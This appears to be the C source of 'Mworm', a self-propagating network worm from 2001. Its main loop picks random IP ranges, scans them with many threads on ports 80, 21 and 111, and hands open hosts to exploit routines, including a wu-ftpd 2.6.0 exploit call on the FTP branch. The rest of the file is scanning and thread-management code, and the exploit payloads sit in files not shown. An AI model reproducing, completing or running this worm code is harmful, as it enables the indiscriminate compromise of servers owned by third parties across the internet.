   //Mworm.c ver 1.0
   //Base on Mscan
   //Begining from 6/4/2001

   #include "common.h"



   int ndone;
   int nlefttoconn,nconn,nlefttoread,nfiles;


   pthread_mutex_t ndone_mutex=PTHREAD_MUTEX_INITIALIZER;
   pthread_cond_t  ndone_cond=PTHREAD_COND_INITIALIZER;

   void *Process_ID(void *vptr);            //predefine this function


   int main(int argc,char *argv[])
   {
       int n,i,j,maxnconn;
       struct host *hptr;
       pthread_t tid;
       unsigned long start,end,counter, indexh;
       char * startip;
       int ScanPort_D[]= { 80, 21, 111, 21, 21, 80, 21, 111 };
       int thisport = 0;

       maxnconn=MAXTHREAD;

   #ifdef DEBUG
       goto WS;
   #endif
   //  daemon_init();      //become a deamon program

   WS:             //the begining entry
        for (; ;){
           // create random IP address, then +255
           startip = create_randomIP ();
           start = inet_addr(startip);
   //      start = inet_addr(argv[1]);
           counter = ntohl(start);

           for (j=0,i=0; i<MAXHOST; counter++,i++){
               if(counter == -1) continue;
               host[j].h_flags=H_NONE;
               host[j].h_network=counter;
               host[j].h_port=ScanPort_D[thisport++];
               if (thisport == 8) thisport = 0;
               sprintf(host[j].h_name,"Thread NO %d",j+1);
               j++;
           }

       HostNumber=nlefttoread=nlefttoconn=nfiles=j;
       nconn=0;
       ndone=0;


       while (nlefttoread>0) {
           while(nconn<maxnconn && nlefttoconn >0) {
               for(i=0;i<nfiles; i++)
                   if (host[i].h_flags==H_NONE)
                       break;
               if (i==nfiles) {
                   printf("Left=%d,but not found\n",nlefttoread);
                   exit(0);
               }
               //printf("Creating Thread %s\n",host[i].h_name);
               pthread_create(&tid,NULL,&Process_ID,&host[i]);
               host[i].h_tid=tid;
               host[i].h_flags=H_CONNECTING;
               nconn++;
               nlefttoconn--;
           }

           pthread_mutex_lock(&ndone_mutex);
           while (ndone==0){
           //  printf("Wate for sig, ndone= %d\n",ndone);
           //  pthread_mutex_unlock(&ndone_mutex);
               pthread_cond_wait(&ndone_cond,&ndone_mutex);
           //  pthread_mutex_lock(&ndone_mutex);
           }
           for (i=0; i<nfiles; i++) {
               if (host[i].h_flags==H_DONE) {
                   pthread_join(host[i].h_tid, (void **) &hptr);
                   if(&host[i] !=hptr) {
                       printf("Error wating thread\n");
                       exit(0);
                   }
                   hptr->h_flags=H_JOINED;
                   ndone--;
                   nconn--;
                   nlefttoread--;
               //  printf("Thread %s done \n",
               //      hptr->h_name);
               }
           }
           pthread_mutex_unlock(&ndone_mutex);
           }

       }

   }

   void *Process_ID(void *vptr)
   {
       struct host *Iptr;
       int sock;
           struct sockaddr_in sin;



       Iptr =(struct host *)vptr;
       sin.sin_addr.s_addr=htonl(Iptr->h_network);

   #ifdef  DEBUG
       printf("IP= %s,Port=%d\n",inet_ntoa(sin.sin_addr),Iptr->h_port);
   #endif

       sock=TCP_NB_connect(Iptr->h_network,Iptr->h_port,CONNECT_TIME);
       if (sock >0) {




   #ifdef  DEBUG
           printf("Host %s Port %d is [OPEN]:  \n",
               inet_ntoa(sin.sin_addr),Iptr->h_port);
   #endif

           switch(Iptr->h_port)
           {
               case 80:        //web hole
                   Handle_Port_80(sock,inet_ntoa(sin.sin_addr),Iptr);
                   break;
               case 21:        // ftp hole
                   if (Handle_Port_21(sock,inet_ntoa(sin.sin_addr),Iptr)){
                       pthread_mutex_lock(&ndone_mutex);
                       wuftp260_vuln(sock, inet_ntoa(sin.sin_addr), Iptr);
                       pthread_mutex_unlock(&ndone_mutex);
                   }

                   break;
               case 111:       //rpc hole
                   if (Handle_Port_STATUS(sock,inet_ntoa(sin.sin_addr),Iptr)){
                       pthread_mutex_lock(&ndone_mutex);
   //                  rpcSTATUS_vuln( inet_ntoa(sin.sin_addr), Iptr);
                       pthread_mutex_unlock(&ndone_mutex);
                   }
                   break;
               case 53:        //linux bind hole
   //              Check_Linux86_Bind(sock,inet_ntoa(sin.sin_addr),Iptr->h_network);
                   break;
               case 515:       //linux lpd hole
   //              Get_OS_Type(Iptr->h_network, inet_ntoa(sin.sin_addr));
   //              Check_lpd(sock,inet_ntoa(sin.sin_addr),Iptr->h_network);
                   break;
               default:
                   break;
           }
           close(sock);
       }

   ENDPROCESS:
       pthread_mutex_lock(&ndone_mutex);
       Iptr->h_flags=H_DONE;
       ndone++;
       pthread_cond_signal(&ndone_cond);
       pthread_mutex_unlock(&ndone_mutex);
       return(Iptr);
   }
